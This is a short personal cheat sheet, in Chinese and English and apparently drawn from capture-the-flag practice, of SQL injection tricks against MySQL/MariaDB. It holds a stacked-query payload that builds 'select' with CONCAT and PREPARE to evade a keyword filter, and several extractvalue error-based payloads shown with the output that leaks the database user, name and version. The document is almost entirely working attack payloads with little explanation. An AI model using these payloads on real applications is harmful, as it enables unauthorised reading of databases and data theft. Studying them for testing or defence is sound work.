---
title: "SQL Injection Tricks"
author: ["4shen0ne"]
draft: false
---

## select 关键字过滤绕过 {#select-关键字过滤绕过}

预编译绕过关键字(select)过滤：

```text
1';Set @sql = CONCAT('se','lect * from `1919810931114514`;');Prepare stmt from @sql;EXECUTE stmt;#
```


## mysql 报错注入 {#mysql-报错注入}

1.  orderby 猜列数

2.  extractvalue

<!--listend-->

```nil
1' and (extractvalue(1,concat(0x7e,user(),0x7e)));#
error 1105 : XPATH syntax error: '~root@localhost~'
1' and (extractvalue(1,concat(0x7e,database(),0x7e)));#
error 1105 : XPATH syntax error: '~supersqli~'
1' and (extractvalue(1,concat(0x7e,version(),0x7e)));#
error 1105 : XPATH syntax error: '~10.3.15-MariaDB~'
```
